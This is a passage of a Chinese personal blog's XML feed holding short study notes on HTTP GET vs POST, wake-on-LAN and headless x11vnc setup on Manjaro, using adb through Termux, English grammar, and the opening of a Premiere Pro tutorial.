6.GET请求在URL中传送的参数是有长度限制的，而POST没有。<br> 7.对参数的数据类型，GET只接受ASCII字符，而POST没有限制。<br> 8.GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。<br> 9.GET参数通过URL传递，POST放在Request body中</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Manjaro+微星B365M主板设置wol</title>
      <link href="/TechnicalExperience/Linux/wol.html"/>
      <url>/TechnicalExperience/Linux/wol.html</url>
      
        <content type="html"><![CDATA[<p> wol(wake on Lan), 局域唤醒主机</p><span id="more"></span><ol><li>首先需要在主板上设置<code>网络唤醒，PCI唤醒</code></li><li>Manjaro系统安装<code>ethtool</code>工具， 查看网卡是否支持wol</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo ethtool eno1</span><br><span class="line">Supports Wake-on: pumbg</span><br><span class="line">        Wake-on: g</span><br></pre></td></tr></table></figure><ol start="3"><li><p>如果Wake-on参数是d(disabled)，使用指令<code>ethtool -s NIC_name wol g</code>设置成g(magic packet activity)</p></li><li><p>查看tlp服务, 将tlp服务设置成开启自启</p><ul><li><code>sudo systemctl status tlp</code></li><li><code>sudo systemctl enable tlp</code></li></ul></li><li><p>更改tlp配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; vim /etc/tlp.conf</span><br><span class="line"></span><br><span class="line">TLP_ENABLE=1</span><br><span class="line">WOL_DISABLE=N</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>无显示器设置x11vnc分辨率</p><ol><li>安装<code>xf86-video-dummy</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">❯ sudo pacman -S dummy</span><br></pre></td></tr></table></figure><ol start="2"><li>添加配置文件</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">❯ sudo vim /usr/share/X11/xorg.conf.d/xorg.conf</span><br><span class="line"></span><br><span class="line">Section <span class="string">&quot;Device&quot;</span> </span><br><span class="line">    Identifier  <span class="string">&quot;Configured Video Device&quot;</span></span><br><span class="line">    Driver      <span class="string">&quot;dummy&quot;</span></span><br><span class="line">EndSection</span><br><span class="line"> </span><br><span class="line">Section <span class="string">&quot;Monitor&quot;</span></span><br><span class="line">    Identifier  <span class="string">&quot;Configured Monitor&quot;</span></span><br><span class="line">    HorizSync 31.5-48.5</span><br><span class="line">    VertRefresh 50-70</span><br><span class="line">EndSection</span><br><span class="line"> </span><br><span class="line">Section <span class="string">&quot;Screen&quot;</span></span><br><span class="line">    Identifier  <span class="string">&quot;Default Screen&quot;</span></span><br><span class="line">    Monitor     <span class="string">&quot;Configured Monitor&quot;</span></span><br><span class="line">    Device      <span class="string">&quot;Configured Video Device&quot;</span></span><br><span class="line">    DefaultDepth 24</span><br><span class="line">    SubSection <span class="string">&quot;Display&quot;</span></span><br><span class="line">    Depth 24</span><br><span class="line">    Modes <span class="string">&quot;1024x800&quot;</span> </span><br><span class="line">    EndSubSection</span><br><span class="line">EndSection</span><br></pre></td></tr></table></figure><ol start="3"><li>reboot</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> manjaro </tag>
            
            <tag> wol </tag>
            
            <tag> archlinux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Termux+adb</title>
      <link href="/TechnicalExperience/Android/Termux-adb.html"/>
      <url>/TechnicalExperience/Android/Termux-adb.html</url>
      
        <content type="html"><![CDATA[<p> 手机可以直接使用termux+adb调试手机, 无需电脑, 无需root</p><span id="more"></span><h2 id="探究原理"><a href="#探究原理" class="headerlink" title="探究原理"></a>探究原理</h2><ol><li>我们知道手机通过USB连接电脑可以进行adb调试, 电脑需要准备adb-tools, adb是C/S架构, 打开USB调试后手机就是客户端, 电脑就是服务端, 电脑绑定在TCP端口5037, 手机也绑定在5037端口, 电脑会去扫描手机5555-5585的端口查找模拟器, 从而建立连接, 服务器可以连接多个设备</li><li>通过这个原理, 我想到了在Termux里安装adb-tools(<a href="https://github.com/MasterDevX/Termux-ADB">项目地址</a>), adb启动后成为服务端, 如下:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* daemon not running. starting it now at tcp:5038 *</span><br><span class="line"><span class="comment">#有点意外, 不是5037, 感觉是客户端在通信时占用5037造成的</span></span><br><span class="line">* daemon started successfully *</span><br></pre></td></tr></table></figure><p>因为手机打开USB调试, 所以Termux会自动连接到模拟器, 从而实现无需电脑, 无需root, 手机+termux就可完成adb指令. so, adb可以做哪些有趣的事呢?    </p><h2 id="adb可以做什么"><a href="#adb可以做什么" class="headerlink" title="adb可以做什么?"></a>adb可以做什么?</h2><blockquote><p>启动adb服务: <code>adb start-server</code></p><p>关闭adb服务: <code>adb kill-server</code></p><p>多设备记得使用<code>-s</code>指定</p></blockquote><p>端口转发: <code>adb forward tcp:8080 tcp:8090</code>, 将本机的8080转发到其他设备的8090, <code>adb reverse</code>反向转发</p><p>交互式shell: <code>adb shell</code></p><p>单命令式shell: <code>adb shell [command]</code></p><blockquote><p>查看可用指令: <code>adb shell ls /system/bin</code></p></blockquote><p>活动管理: <code>adb shell am -h</code></p><p>包管理: <code>adb shell pm -h</code></p><p>截图: <code>adb shell screencap /sdcard/screen.png</code></p><p>录视频: <code>adb shell screenrecord /sdcard/demo.mp4</code></p><blockquote><p>值得注意的是一个android设备只能授权给一个客户端, 比如已经给termux授权过后又给电脑usb是没用的</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Termux </tag>
            
            <tag> adb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10-翻译句子</title>
      <link href="/English/G/10-%E7%BF%BB%E8%AF%91%E5%8F%A5%E5%AD%90.html"/>
      <url>/English/G/10-%E7%BF%BB%E8%AF%91%E5%8F%A5%E5%AD%90.html</url>
      
        <content type="html"><![CDATA[<p>总结一句话就是<code>把后置定语和除目的,结果,伴随的状语调到所修饰的词的前面</code></p><span id="more"></span><p>需要注意的是SVO后面可以接OC, DO, 后置定语, 状语, 同位语. 要根据语境具体分析</p><p>eg:</p><ol><li><p>You should put your things in order.</p><p>分析: in order是things的一个方面, 是OC. (考虑过in order put, 虽然能说通, 但句意上它是OC)</p><p>翻译: 你应该把你的东西放整齐.</p></li><li><p>To swim in Kunming lake is great pleasure.</p><p>分析: To swim是S, in kunming是地点状语, is是v, 后面是P</p><p>翻译: 在昆明湖游泳是很快乐的事.</p></li><li><p>Lihua showed me how to oprate the computer.</p><p>分析: to oprate不是谓语, 这是一个简单句, show是vt2, 接IO(me)+DO.</p><p>翻译: Lihua向我展示了怎样操作电脑.</p></li><li><p>Her mother often goes out to go shopping on Sunday.</p><p>分析: often频度副词, goes out谓语(vi), 外出的目的是go shopping, to go shopping是目的状语, on Sunday是时间状语</p><p>翻译: 她妈妈经常在星期天出去购物.</p></li><li><p>He sat there reading a novel that I lent him last Sunday.</p><p>分析: there是adv词性, 修饰sat(vi), reading a novel是伴随状语, that后面是定从, lent后接双宾语, that做DO成份</p><p>翻译: 他坐在那(在那坐着)读着一本我上个星期天借给他的小说.</p></li><li><p>^Yesterday the scientist made a report on modern science for us.</p><p>分析: 看到for&amp;to就要想到是不是双宾语, made是vt2, a report是DO, for us是IO, on modern science是后置定语</p><p>翻译: 昨天科学家制作了一份关于现代科学的报告给我们.</p></li></ol><blockquote><p>看到for sb/to sb就要想到双宾语</p><p>on在这里代表关于, on是很官方的, about是一般的</p></blockquote><ol start="7"><li><p>I don’t believe that story true.</p><p>分析: don’t believe 是宾语, that story 是宾语, true是adj词性, 排除同位语, 状语和DO, 故事真的, 是故事的一个侧面, 所以代表true是OC, 不是后置定语</p><p>翻译: 我不相信这个故事真的</p></li><li><p>We saw the students of class one playing basketball on the playground happily.</p><p>分析: of class one 是后置定语, playing basketball 是OC, on the playground 是地点状语, happily是程度副词.</p><p>翻译: 我们看到一班的同学在操场上开心的打篮球.</p></li><li><p>Comrade Li stood up and spoke at the close of the meeting.</p><p>分析: 这是一个简单句, stood up and spoke是一个大V, at the close是时间状语–结束时, of the meeting做后置定语, 修饰限定the close-</p><p>翻译: 李同志在会议结束时站起并讲话</p></li><li><p>It was a pity that you didn’t watch that wonderful football match.</p><p>分析: it做形式主语, 真的主语在that后面, 第二个that后面是名词短语</p><p>翻译: 你没有看那场精彩的足球比赛是一个遗憾.</p></li><li><p><u>We</u> <u>should do</u> <u>something</u> <u>to help the comrades</u> <u>in difficulties</u>.</p><p>分析: 当主句完整时(to do优先考虑目的状), 也要注意something这个不定代词极有可能接后置定语, in difficulties是后置定语</p><p>翻译: 我们应该做一些事去帮助那些有困难的同志</p></li><li><p>You had better answer the question in English.</p><p>分析: had better助动词, answer(vt), in English是方式状语, 修饰answer</p><p>翻译: 你最好用英语回答这个问题.</p></li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>09-高级语法及技巧</title>
      <link href="/English/G/09-%E9%AB%98%E7%BA%A7%E8%AF%AD%E6%B3%95%E5%8F%8A%E6%8A%80%E5%B7%A7.html"/>
      <url>/English/G/09-%E9%AB%98%E7%BA%A7%E8%AF%AD%E6%B3%95%E5%8F%8A%E6%8A%80%E5%B7%A7.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>..</p></blockquote><span id="more"></span><h2 id="被动即完整"><a href="#被动即完整" class="headerlink" title="被动即完整"></a>被动即完整</h2><p>将句子改为被动, 主语就变成了方式状语, 可要可不要. </p><p>eg:</p><ul><li>We cleaned the room.</li><li>The room <strong>was cleaned</strong> [by us].</li></ul><p>间宾被动除外(缺少直宾不完整).</p><h2 id="省略"><a href="#省略" class="headerlink" title="省略"></a>省略</h2><p>省略掉重复的但<code>不会产生歧义</code></p><p>eg:</p><ul><li>Do you known Linux?</li><li>I don’t know [Linux].</li></ul><blockquote><p>know是及物动词, 但平常都是省略宾语的用法.</p></blockquote><p>eg:</p><ul><li>I don’ t know what I should do.(what做宾语成分)</li><li>省略: I don’t know what to do.</li><li>I don’t know how I should do it.(how是副词词性)</li><li>省略: I don’t know how to do it.</li></ul><blockquote><p>解析: 省略主语后, 不能使用谓语形式, 需要转为非谓语, 而should do和to do都表不确定, 所以使用to do替换should do.</p></blockquote><h2 id="判断连词-1的情况"><a href="#判断连词-1的情况" class="headerlink" title="判断连词!=1的情况"></a>判断连词!=1的情况</h2><ol><li>从句与从句形成并列关系(多了一个并列连词)</li><li>找错谓语(过去分词是非谓语, 表被动)</li><li>找错连接词(that man is good)</li><li>省略(下面重点讲)</li></ol><h3 id="省略连词"><a href="#省略连词" class="headerlink" title="省略连词"></a>省略连词</h3><blockquote><p>据morty老师分析, 当句子成分非常明显则可以省略连词</p></blockquote><ol><li><p>宾从第一个that</p><p>I think [that] you are good and that you are beautiful.</p></li><li><p>定从的关系代词(连接词)做宾语</p><p>The book [that] I bought yesterday is good.</p></li><li><p>定从的先行词是the way+从句完整时, 引导词可以用that/in which/省略</p><p>I like the way  [that/in which]/ ] you like lie. </p></li></ol><h3 id="反向找省略连接词"><a href="#反向找省略连接词" class="headerlink" title="反向找省略连接词"></a>反向找省略连接词</h3><blockquote><p>因为连词位于从句句首, 连词要么充当主语, 要么不充当, 通过从句的动词可以分析省略的连词</p></blockquote><p>简单来说从句分为两类</p><ol><li><p>引导词+V+其他</p></li><li><p>引导词+S+V+其他</p></li></ol><p>eg:</p><ul><li>I think(v) [that] he is(v) right.</li></ul><ul><li>This is(v) the park [that/which] we visited(v) last week.</li></ul><blockquote><p>句首的引导词不可省略</p></blockquote><h4 id="3大难点"><a href="#3大难点" class="headerlink" title="3大难点"></a>3大难点</h4><ol><li><p>主从: <code>[引导词]+S(句子)+V</code></p><p>eg: I think what you did id of help.</p><p>分析: </p><ul><li>of help==helpful,be of use==be useful</li><li>3个v, think, did(后接原型), is, 说明有2个连接词</li><li>但是只有what. is的主语是what you did</li><li>所以I think后面省略了一个连接词that</li></ul></li><li><p>主谓相隔: <code>[引导词]+S+后置定语+V</code></p><p>eg: I think the boy <u>wearing a green hat</u> is pig.</p><p>分析:</p><ul><li>wearing a green hat是后置定语</li><li>think后面是宾语从句, 后面缺少一个连接词that</li></ul></li><li><p>主语前有状语: <code>[引导词]+状语+S+V</code></p><p>eg: I think(v) form the beginning you are(v) a good.</p><p>分析:</p><ul><li>form the beginning是状语, 修饰动词或者整个句子</li><li>它在从句主语you前面, 所以think后省略了一个连接词that</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>08-特殊句子</title>
      <link href="/English/G/08-%E7%89%B9%E6%AE%8A%E5%8F%A5%E5%AD%90.html"/>
      <url>/English/G/08-%E7%89%B9%E6%AE%8A%E5%8F%A5%E5%AD%90.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>..</p></blockquote><span id="more"></span><h2 id="感叹句"><a href="#感叹句" class="headerlink" title="感叹句"></a>感叹句</h2><p>感叹句一般由<code>what</code>and<code>how</code>开头</p><p>分析what和how在句中的词性</p><ul><li><p>What do you want?</p><p>what作名词</p></li><li><p>What color do you want?</p><p>what作形容词</p></li><li><p>How do you come here?</p><p>how作副词修饰动词</p></li></ul><h3 id="通用公式"><a href="#通用公式" class="headerlink" title="通用公式"></a>通用公式</h3><ul><li><p>What(adj)+名词短语+[主+谓]</p><p>What a good boy he is!</p><p>What good boys they are!</p><p>What good news it is!</p><p>What good weather!</p></li><li><p>How(adv)+V/adv/adj+[主+谓]</p><p>How good the boy is!</p><p>How fast he runs!</p></li></ul><blockquote><p>what修饰人和物, how修饰一种属性</p></blockquote><h2 id="祈使句"><a href="#祈使句" class="headerlink" title="祈使句"></a>祈使句</h2><p>特点:</p><ol><li>省略S<ul><li>[You] shut up!</li><li>[we] let’s go!</li></ul></li><li>Do开头<ul><li>Please sit down!</li><li>be quiet!</li></ul></li><li>表达命令/要求/建议<ul><li>help!</li><li>be careful!</li></ul></li><li>天然表将来<ul><li>open the door!</li></ul></li></ol><h2 id="疑问句"><a href="#疑问句" class="headerlink" title="疑问句"></a>疑问句</h2><h3 id="一般疑问句"><a href="#一般疑问句" class="headerlink" title="一般疑问句"></a>一般疑问句</h3><p>公式: 助动词 &gt; 系动词(be) &gt; 抽象出的狭义助动词(除be+实义动词) + 主语 + 其他?</p><ul><li><p>实义动词</p><p>He plays football every day.–&gt;Does he play..</p><p>You play football every day.–&gt;Do you play…</p><p>He played football yesterday.–&gt;Did he play..</p></li></ul><blockquote><p>does, did 后接动词原型</p></blockquote><ul><li><p>系动词</p><p>He is student–&gt;Is he a student?</p><p>You are a student–&gt;Are you a student?</p><p>They are students–&gt;Are they..</p><p>It sounds interesting–&gt;Does it sound interesting?</p><p>They bacame friends–&gt;Did they bacome friends?</p><p>He seems right–&gt;Does he seem right?</p></li><li><p>助动词+实义</p><p>He is fired–&gt;Is he fired?</p><p>He can speak English–&gt;Can he speak English?</p><p>He did play football yesterday–&gt;Did he do play …(表示强调)</p><p>He has become a college student–&gt; Has he become..</p></li><li><p>助动词+系动词</p><p>He is being a man–&gt;Is he being a man?</p><blockquote><p>He is a man.</p><p>He is being a man. being有暂时性,变得,这次的意思</p></blockquote><p>We are becomging friends–&gt;Are we becomeing friends?</p><p>Leo can be the one–&gt;Can leo be the one?</p></li></ul><h3 id="一般疑问特殊情况"><a href="#一般疑问特殊情况" class="headerlink" title="一般疑问特殊情况"></a>一般疑问特殊情况</h3><ol><li><p>There be.. –&gt; be there..</p></li><li><p>some | any</p><p>I have something to say –&gt; Do you have anything to say?</p><p>Would you like something to drink?(表示真诚的)</p></li><li><p>不确定回答 | 肯定回答</p><p>Is he a man?</p><p>Isn’t he a man?</p><p>回答: yes, he is/ no, he isn’t</p></li></ol><h3 id="反义疑问句"><a href="#反义疑问句" class="headerlink" title="反义疑问句"></a>反义疑问句</h3><blockquote><p>反义疑问句表示提问人的看法, 没有把握, 需要对方赞同. 回答yes or no.</p></blockquote><p>规则: 前肯后否, 前否后肯</p><p>构成形式抽象:</p><ul><li><u>完整句子</u>, <u>助/系</u> <u>主语(人称代词)</u> [实义动词抽象成狭义助动词]</li><li><code>there be</code>句子主语用<code>there</code>.</li><li>当主语是一个句子时, 用<code>it</code>代</li><li>祈使句使用 <code>will you?/shall we</code>?</li></ul><p>例1:</p><ul><li>He can speack English, <strong>can’t he?</strong></li><li>He is a good student, <strong>isn’t he?</strong></li><li>Lily speaks good English, <strong>Doesn’t she?</strong></li><li>Tom can hardly(否定) speak English, <strong>can he?</strong></li></ul><p>例2:</p><ul><li>There is car in the park, <strong>isn’t there?</strong> </li><li><u>What he said(S)</u> is right, <strong>isn’t it?</strong></li></ul><p>例3:</p><ul><li>[You] shut up, <strong>will you?/won’t you?</strong></li><li>[We] let’s go, <strong>shall we?/shan’t we?</strong></li></ul><blockquote><p>祈使句天然表将来</p></blockquote><h3 id="选择疑问句"><a href="#选择疑问句" class="headerlink" title="选择疑问句"></a>选择疑问句</h3><p>回答从问题里面二选一.</p><h3 id="特殊疑问句"><a href="#特殊疑问句" class="headerlink" title="特殊疑问句"></a>特殊疑问句</h3><blockquote><p>具体提问, 具体回答</p></blockquote><p><strong>代词词性</strong></p><p>名词: <code>what,which,who,whom</code></p><p>形容词: <code>what,which,whose</code></p><p>副词: <code>when,where,why,how</code></p><h4 id="What"><a href="#What" class="headerlink" title="What"></a>What</h4><ul><li>what做宾语: you want a cat. –&gt; What do you want?</li></ul><blockquote><p>疑问句相当于部分倒装, 谓语要提前 , want要用do代表</p></blockquote><ul><li>what做表语: Your problem is your face. –&gt; what is your problem?</li><li>what做定语: You want size 5. –&gt; What size do you want?</li><li>what做主语: All work and no play makes Jack a dull boy? –&gt; What makes Jack a dull boy?</li></ul><h4 id="Which"><a href="#Which" class="headerlink" title="Which"></a>Which</h4><blockquote><p>what与which的主要区别就是, 前者没有确定范围, 后者在确定范围里具体选择</p></blockquote><ul><li>which做宾语: You want the red one. –&gt; Which do you want?</li><li>做表语: My choice is the red one. –&gt; Which is your choice?</li><li>做定语: You are in class 5. –&gt; Which class are you in?</li><li>做主语: The red one is better. –&gt; Which is better?</li></ul><h4 id="Who"><a href="#Who" class="headerlink" title="Who"></a>Who</h4><ul><li>主语: Jay is my favorite singer. –&gt;Who is your favorite singer?</li><li>主语: Jay makes the best music. –&gt; Who makes the best music?</li></ul><h4 id="whom-谁"><a href="#whom-谁" class="headerlink" title="whom(谁)"></a>whom(谁)</h4><blockquote><p>whom只能做宾语.</p><p>who与whom的区别就是who做主语, whom做宾语. 在日常口语中不常见, 只在书面中存在</p></blockquote><ul><li>I choose Jay. –&gt; whom do your choose?</li></ul><h4 id="whose-谁的-adj"><a href="#whose-谁的-adj" class="headerlink" title="whose(谁的,adj)"></a>whose(谁的,adj)</h4><ul><li>I will join Jay’s team. –&gt; Whose team will your join ? </li></ul><blockquote><p>有助动词提前助动词</p></blockquote><ul><li>Jay’s music is the best. –&gt; whose music is the best?</li></ul><h4 id="When-几时-Where-何处-Why-为何-How-怎样-adv"><a href="#When-几时-Where-何处-Why-为何-How-怎样-adv" class="headerlink" title="When(几时),Where(何处),Why(为何),How(怎样) [adv]"></a>When(几时),Where(何处),Why(为何),How(怎样) [adv]</h4><ul><li>I came here at 8:30. –&gt; when did you came here?</li><li>I came here by bus. –&gt; How did you came here?</li><li>I came here to meet her. –&gt; Why did you came here?</li><li>I will meet her at the gate. –&gt; Where will you meet her?</li><li>I exercise <u>three times a week(一周三次)</u>. –&gt; <u>How often</u> do you exercse?</li><li>I waited for him <u>for 3 hours</u>. –&gt; <u>How long(多长时间)</u> did you wait for him?</li><li>He will come back <u>in an hour</u>.  –&gt; <u>How soon(还要多久)</u> will he come back?</li><li>My house is <u>three miles</u> form the supermarket. –&gt; <u>How far(距离多远)</u> is your house form the supermarket?</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>疑问词不作主语–特殊疑问词+一般疑问句语序</li><li>作主语–不变序</li><li>有助动词提前助动词, 有be动词提前be动词, 其他情况抽象成狭义助动词</li></ul><h2 id="强调句"><a href="#强调句" class="headerlink" title="强调句"></a>强调句</h2><p>公式: <code>it is/was + 强调部分 + that/who(人)/whom(人,宾语) + 其他</code></p><p>例子:</p><ul><li>原句: She told me a joke in the classroom yesterday afternoon.<ul><li>强调she: It is/was she that/who told me a joke in the classroom yesterday afternoon.</li><li>强调me: It is/was me that/who/whom she told a joke in the classroom yesterday afternoon.</li><li>强调a joke: It is a joke that she told me in the classroom yesterday afternoon.</li><li>强调in the classroom: It is in the classroom that she told me a joke yesterday afternoon.</li><li>强调told: She did tell me a joke in the classroom yesterday afternoon.</li></ul></li><li>改装原句: She told a joke to me in the classroom yesterday afternoon.<ul><li>强调a joke: It is a joke that she told to me in the classroom yesterday afternoon.</li><li>强调me: It is to me that/who/whom she told a joke in the classroom yesterday afternoon.</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动词不规则变化整理</title>
      <link href="/English/G/%E5%8A%A8%E8%AF%8D%E4%B8%8D%E8%A7%84%E5%88%99%E5%8F%98%E5%8C%96%E6%95%B4%E7%90%86.html"/>
      <url>/English/G/%E5%8A%A8%E8%AF%8D%E4%B8%8D%E8%A7%84%E5%88%99%E5%8F%98%E5%8C%96%E6%95%B4%E7%90%86.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>不规则整理</p></blockquote><span id="more"></span><h2 id="ABB"><a href="#ABB" class="headerlink" title="ABB"></a>ABB</h2><table><thead><tr><th>do</th><th>did</th><th>done</th><th>mean</th></tr></thead><tbody><tr><td>offer</td><td>offered</td><td>offered</td><td>提供</td></tr><tr><td>clean</td><td>cleaned</td><td>cleaned</td><td>清扫</td></tr><tr><td>tell</td><td>told</td><td>told</td><td>告诉</td></tr><tr><td>sit</td><td>sat</td><td>sat</td><td>坐</td></tr><tr><td>stand</td><td>stood</td><td>stood</td><td>站立</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="ABA"><a href="#ABA" class="headerlink" title="ABA"></a>ABA</h2><table><thead><tr><th>do</th><th>did</th><th>done</th><th>mean</th></tr></thead><tbody><tr><td>become</td><td>became</td><td>become</td><td>成为</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="ABC"><a href="#ABC" class="headerlink" title="ABC"></a>ABC</h2><table><thead><tr><th>do</th><th>did</th><th>done</th><th>mean</th></tr></thead><tbody><tr><td>choose</td><td>chose</td><td>chosen</td><td>选择</td></tr><tr><td>speak</td><td>spoke</td><td>spoken</td><td>说</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小知识整理</title>
      <link href="/English/G/%E5%B0%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86.html"/>
      <url>/English/G/%E5%B0%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>英语小知识，自己的理解心得</p></blockquote><span id="more"></span><h2 id="of和for的区别"><a href="#of和for的区别" class="headerlink" title="of和for的区别"></a>of和for的区别</h2><p>of一般代表什么的什么, for代表为了什么, 但在短语里面意思也会不大一样</p><p>eg:</p><ul><li>I bought a gift formy mother. 我为妈妈买了一个礼物</li><li>The ways of learning English. 学英语的方法</li><li>I have doing homework for two hours.</li></ul><h2 id="什么时候用are"><a href="#什么时候用are" class="headerlink" title="什么时候用are"></a>什么时候用are</h2><p>主语为第三人称单数（如he, she, it, Tom, Mary等）时用is，主语为复数（we, they, you， Tom and Mary等），或第二人称单数（you）时，都用are</p><h2 id="什么时候用does"><a href="#什么时候用does" class="headerlink" title="什么时候用does"></a>什么时候用does</h2><p>当你找到了句子中的动词,就知道它的疑问形式和否定形式要使用do或does(主语是第一人称I,第二人称you,及其他的复数名词、人称代词时,要选用do;主语为第三人称单数时,选用does.)如果句子中没有动词,只有名词或形容词,就要使用am\is\are了.</p><h2 id="动词的5种形式"><a href="#动词的5种形式" class="headerlink" title="动词的5种形式"></a>动词的5种形式</h2><p><a href="https://zhuanlan.zhihu.com/p/57203501">https://zhuanlan.zhihu.com/p/57203501</a></p>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>短语整理</title>
      <link href="/English/G/%E7%9F%AD%E8%AF%AD%E6%95%B4%E7%90%86.html"/>
      <url>/English/G/%E7%9F%AD%E8%AF%AD%E6%95%B4%E7%90%86.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>英语短语</p></blockquote><span id="more"></span><table><thead><tr><th>短语</th><th>意思</th></tr></thead><tbody><tr><td>fond of</td><td>喜爱</td></tr><tr><td>neither…, nor…</td><td>既不..也不..</td></tr><tr><td>by no means</td><td>绝不</td></tr><tr><td>go on</td><td>继续</td></tr><tr><td>stand up</td><td>起立</td></tr><tr><td>how do you do</td><td>你好吗？</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习PR</title>
      <link href="/Premiere/PR-base.html"/>
      <url>/Premiere/PR-base.html</url>
      
        <content type="html"><![CDATA[<p>记录学习pr的过程</p><span id="more"></span><h2 id="录机与放机"><a href="#录机与放机" class="headerlink" title="录机与放机"></a>录机与放机</h2><p>录机: 源面板</p><p>放机: 目标面板</p><p>源面板和目标面板都可以进行选材, 可以选择插入和覆盖</p><blockquote><p>拖动素材需要注意一点就是轨道的第一选项一定要选中, 不然不能拖进该轨道</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/pr01.png" alt="pr01"></p><p>拖入素材时视频和音频是链接着的，想分开可以右键取消链接</p><h2 id="添加标记"><a href="#添加标记" class="headerlink" title="添加标记"></a>添加标记</h2><p>添加标记方便寻找某些视频片段(在长视频里), 在窗口的标记菜单里可以为标记添加更多介绍.</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/pr03.png" alt="pr02"></p><blockquote><p>也可以在时间轴里添加标记</p></blockquote><h2 id="速度"><a href="#速度" class="headerlink" title="速度"></a>速度</h2><p>为视频增减速度的原理就是插帧和减帧，可通过以下操作调整</p><ol><li>时间轴面板选中素材右键–&gt;速度/持续时间</li><li>工具面板–&gt;比率拉伸工具</li></ol><p>在速度里支持倒放</p><h2 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h2><p>序列就是一个剪辑后的视频，可以将一个序列当成一个素材导入其他序列，可以导入细节，也可以整体导入</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/pr04.png" alt="pr04"></p><blockquote><p>巧用序列嵌套: 需要做一个重复效果时, 比如无限旋转, 可以做一个旋转一圈的序列1, 